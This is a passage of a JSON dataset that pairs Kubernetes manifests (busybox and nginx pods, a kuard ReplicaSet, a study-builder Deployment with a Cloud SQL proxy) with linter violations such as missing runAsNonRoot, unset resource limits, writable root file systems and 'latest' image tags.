    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox\n    name: failing-pod\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"failing-pod\" is not set to runAsNonRoot"
  },
  {
    "id": "2046",
    "manifest_path": "data/manifests/the_stack_sample/sample_0481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox\n    name: failing-pod\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"failing-pod\" has cpu request 0"
  },
  {
    "id": "2047",
    "manifest_path": "data/manifests/the_stack_sample/sample_0481.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: failing-pod\nspec:\n  containers:\n  - args:\n    - /bin/sh\n    - -c\n    - while true; do echo $(date) >> ~/tmp/curr-date.txt; sleep 5; done;\n    image: busybox\n    name: failing-pod\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"failing-pod\" has memory limit 0"
  },
  {
    "id": "2048",
    "manifest_path": "data/manifests/the_stack_sample/sample_0484.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"queue\" does not have a read-only root file system"
  },
  {
    "id": "2049",
    "manifest_path": "data/manifests/the_stack_sample/sample_0484.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"queue\" is not set to runAsNonRoot"
  },
  {
    "id": "2050",
    "manifest_path": "data/manifests/the_stack_sample/sample_0484.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"queue\" has cpu request 0"
  },
  {
    "id": "2051",
    "manifest_path": "data/manifests/the_stack_sample/sample_0484.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"queue\" has memory limit 0"
  },
  {
    "id": "2052",
    "manifest_path": "data/manifests/the_stack_sample/sample_0487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2053",
    "manifest_path": "data/manifests/the_stack_sample/sample_0487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2054",
    "manifest_path": "data/manifests/the_stack_sample/sample_0487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2055",
    "manifest_path": "data/manifests/the_stack_sample/sample_0487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2056",
    "manifest_path": "data/manifests/the_stack_sample/sample_0487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2057",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"cloudsql-proxy\" is using an invalid container image, \"gcr.io/cloudsql-docker/gce-proxy:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2058",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"study-builder\" is using an invalid container image, \"gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2059",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"cloudsql-proxy\" does not have a read-only root file system"
  },
  {
    "id": "2060",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"study-builder\" does not have a read-only root file system"
  },
  {
    "id": "2061",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"cloudsql-proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "2062",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      - name: cloudsql-proxy\n        image: gcr.io/cloudsql-docker/gce-proxy:latest\n        command:\n        - /cloud_sql_proxy\n        - -instances=<PREFIX>-<ENV>-data:<LOCATION>:mystudies=tcp:3306\n        - -credential_file=/secrets/gcloud_key/key.json\n        volumeMounts:\n        - name: gcloud-key-volume\n          mountPath: /secrets/gcloud_key\n          readOnly: true\n      volumes:\n      - name: gcloud-key-volume\n        secret:\n          secretName: study-builder-gke-sa-gcloud-key\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"study-builder\" is not set to runAsNonRoot"
  },
  {
    "id": "2063",
    "manifest_path": "data/manifests/the_stack_sample/sample_0490.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: study-builder\n  labels:\n    app: study-builder\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: study-builder\n  template:\n    metadata:\n      labels:\n        app: study-builder\n      annotations:\n        sidecar.istio.io/inject: 'true'\n    spec:\n      containers:\n      - name: study-builder\n        image: gcr.io/<PREFIX>-<ENV>-apps/study-builder:latest\n        env:\n        - name: DB_USER\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbusername\n        - name: DB_PASS\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbpassword\n        - name: DB_NAME\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: dbname\n        - name: DB_INSTANCE_URL\n          value: 127.0.0.1\n        - name: FROM_EMAIL_ADDRESS\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_address\n        - name: FROM_EMAIL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: email_password\n        - name: SMTP_HOSTNAME\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_hostname\n        - name: SMTP_USE_IP_ALLOWLIST\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: smtp_use_ip_allowlist\n        - name: FROM_EMAIL_DOMAIN\n          valueFrom:\n            secretKeyRef:\n              name: email-credentials\n              key: from_email_domain\n        - name: CLIENT_ID\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: client_id\n        - name: SECRET_KEY\n          valueFrom:\n            secretKeyRef:\n              name: study-builder-credentials\n              key: secret_key\n        - name: STUDY_BUILDER_BASE_URL\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: studies_base_url\n        - name: PARTICIPANT_USER_DATASTORE_URL\n          value: http://participant-user-datastore-np:50000/participant-user-datastore\n        - name: RESPONSE_DATASTORE_URL\n          value: http://response-datastore-np:50000/response-datastore\n        - name: SCIM_AUTH_URL\n          value: http://auth-server-np:50000/auth-server\n        - name: GCP_BUCKET_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: study_resources_bucket_name\n        - name: ORG_NAME\n          valueFrom:\n            secretKeyRef:\n              name: shared-secrets\n              key: org_name\n        - name: CATALINA_OPTS\n          value: -Duser.timezone=America/New_York\n        - name: GOOGLE_APPLICATION_CREDENTIALS\n          value: /secrets/gcloud_key/key.json\n        ports:\n        - containerPort: 8080\n        readinessProbe:\n          httpGet:\n            path: /studybuilder/healthCheck.do\n            port: 8080\n          initialDelaySeconds: 180\n          periodSeconds: 20\n        resources:\n          requests:\n            memory: 500Mi\n            cpu: 50m\n        